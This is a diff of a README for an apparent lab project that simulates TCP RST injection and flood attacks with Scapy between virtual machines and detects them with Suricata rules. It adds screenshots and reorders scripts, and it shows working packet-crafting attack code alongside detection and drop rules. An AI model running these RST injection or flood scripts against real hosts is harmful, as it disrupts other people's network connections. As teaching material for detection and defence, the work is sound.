@@ -25,6 +25,8 @@ This project demonstrates a TCP Reset (RST) attack on a network and the configur
    - Use Wireshark on the Kali VM to capture the TCP handshake between the client and server.
    - Apply the filter `tcp` to view only TCP packets.
    - Analyze the packets to identify the sequence and acknowledgment numbers for the active connection.
+     
+     ![r1](https://github.com/user-attachments/assets/68c19329-d9ea-4dac-abce-29fd9126080d)
 
 2. **Server Script (Kali VM)**:
 
@@ -44,6 +46,9 @@ This project demonstrates a TCP Reset (RST) attack on a network and the configur
    print(f"Received: {data}")
    conn.close()
    ```
+    
+      ![r2](https://github.com/user-attachments/assets/48654b34-86e0-42cb-87b0-b394a7cf0c9d)
+
 **2.Client Script (Ubuntu VM):**
 
 Run the following client script to connect to the server:
@@ -56,9 +61,18 @@ client_socket.connect(('192.168.100.50', 12345))  # Replace with the server VM's
 client_socket.sendall(b'Hello, server!')
 client_socket.close()
 ```
+![r3](https://github.com/user-attachments/assets/3d1731d1-01a9-4eef-8cf5-aeb7a1cfb73b)
+
+![r4](https://github.com/user-attachments/assets/532019c6-8039-4bf7-aed0-3e33d07607db)
+
 **3.Capture Sequence and Acknowledgment Numbers:**
 
 Use the Wireshark capture to determine the sequence and acknowledgment numbers from the established connection. These numbers will be used in the attack scripts to craft valid RST packets.
+
+![r5](https://github.com/user-attachments/assets/2583e578-bcaf-483a-adf2-53a50fcd61ed)
+
+![r6](https://github.com/user-attachments/assets/301df6df-c08e-4492-a21a-788f222466a0)
+
 
 ## Attack Scripts
 
@@ -88,6 +102,13 @@ rst_packet = ip/tcp
 # Send the RST packet
 send(rst_packet)
 ```
+
+![r7](https://github.com/user-attachments/assets/ba1b5969-3f6a-45bd-845e-4ed5a052d408)
+
+![r8](https://github.com/user-attachments/assets/f84cba4a-e555-4940-b2bc-c61669e0b0ac)
+
+![r9](https://github.com/user-attachments/assets/17353f47-732c-4284-ae0f-30d261acc02a)
+
 **Script 2: RST Flood Attack without Active Connection**
 ```python
 from scapy.all import *
@@ -111,6 +132,11 @@ for i in range(packet_count):
 
 print("Attack completed.")
 ```
+
+![r10](https://github.com/user-attachments/assets/9b9c3048-0d40-4364-8c77-ecdb49f180d5)
+
+![r11](https://github.com/user-attachments/assets/da591d17-ab66-4257-a48f-a104b2fbd0e0)
+
 **Script 3: RST Flood Attack with Active Connection**
 ```python
 
@@ -143,33 +169,12 @@ for i in range(packet_count):
 
 print("Attack completed.")
 ```
-**Script 4: RST Packet with Payload**
-```python
+![r12](https://github.com/user-attachments/assets/87207c1f-9fb7-4710-84ac-f4fb4da13a49)
 
-from scapy.all import *
+![r13](https://github.com/user-attachments/assets/67d87041-b5e8-45dc-a483-8a49b7d0f7f9)
 
-def send_rst_with_large_payload(target_ip, target_port):
-    # Define a larger payload
-    large_payload = b'\x00\x01\x02\x03' * 50  # 200 bytes of payload
-    
-    # Create a packet with RST flag and the large payload
-    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='R', seq=1, ack=1) / Raw(load=large_payload)
-    
-    # Print packet details
-    print(f"Sending packet to {target_ip}:{target_port}")
-    print(f"Payload (first 50 bytes): {large_payload[:50]}")
-    print(f"Packet details:\n{packet.show(dump=True)}")
-    
-    # Send the packet
-    send(packet, verbose=1)  # Set verbose to 1 to see the packet details
 
-# Replace with the IP address of your target
-target_ip = "192.168.100.50"  # The IP address of the VM running Suricata
-target_port = 80
-
-send_rst_with_large_payload(target_ip, target_port)
-```
-**Script 5: RST During Active connection**
+**Script 4: RST During Active connection**
 ```python
 Script: 
 from scapy.all import *
@@ -197,6 +202,40 @@ print(f"TCP Layer: {tcp.summary()}")
 pkt = ip/tcp
 print(f"Packet: {pkt.summary()}")
 ```
+![r14](https://github.com/user-attachments/assets/5765319d-336e-4ffe-a856-6cc31fa325a5)
+
+![r15](https://github.com/user-attachments/assets/0e407783-7cc5-45be-b759-4b0d331de40e)
+
+**Script 5: RST Packet with Payload**
+```python
+
+from scapy.all import *
+
+def send_rst_with_large_payload(target_ip, target_port):
+    # Define a larger payload
+    large_payload = b'\x00\x01\x02\x03' * 50  # 200 bytes of payload
+    
+    # Create a packet with RST flag and the large payload
+    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='R', seq=1, ack=1) / Raw(load=large_payload)
+    
+    # Print packet details
+    print(f"Sending packet to {target_ip}:{target_port}")
+    print(f"Payload (first 50 bytes): {large_payload[:50]}")
+    print(f"Packet details:\n{packet.show(dump=True)}")
+    
+    # Send the packet
+    send(packet, verbose=1)  # Set verbose to 1 to see the packet details
+
+# Replace with the IP address of your target
+target_ip = "192.168.100.50"  # The IP address of the VM running Suricata
+target_port = 80
+
+send_rst_with_large_payload(target_ip, target_port)
+```
+![r16](https://github.com/user-attachments/assets/2c920390-4bc2-4d47-ac71-9cab2f05e32d)
+
+![r17](https://github.com/user-attachments/assets/054812ea-0018-465e-812d-04b65038ce6a)
+
 ## Suricata Rules
 **Detect TCP RST Packet:**
 
@@ -224,11 +263,11 @@ drop tcp $HOME_NET any -> $HOME_NET any (msg:"RST Packet with Payload"; flags:R;
 drop tcp $HOME_NET any -> $HOME_NET any (msg:"RST Packet with Payload"; flags:R; content:!"|00 01 02 03|"; classtype:policy-violation; sid:1000013; rev:1;)
 ```
 ## Code File
--(Server Script)[Server Script]
--(Client Script)[Client Script]
--(RST Injection Script)[(RST Injection Script]
--(RST Flood Script)[RST Flood Script]
--(RST Flood with Active Connection Script)[RST Flood with Active Connection Script]
+-[ServerScript.py](ServerScript.py)
+-[ClientScript.py](ClientScript.py)
+-[RSTInjectionScript.py](RSTInjectionScript.py)
+-[RSTFloodScript.py](RSTFloodScript.py)
+-[RSTFloodwithActiveConnectionScript.py](RSTFloodwithActiveConnectionScript.py)
 
 ## Contributions
 Contributions to this project are not welcome. Please follow the guidelines below for contributions:
@@ -237,6 +276,5 @@ Contributions to this project are not welcome. Please follow the guidelines belo
 This project is licensed under the MIT License.
 
 
-print(f"Packet: {pkt.summary()}")
 This documentation outlines the steps and code necessary to simulate TCP RST attacks and use Suricata to detect and respond to these threats, making it an educational resource for network security enthusiasts.
 
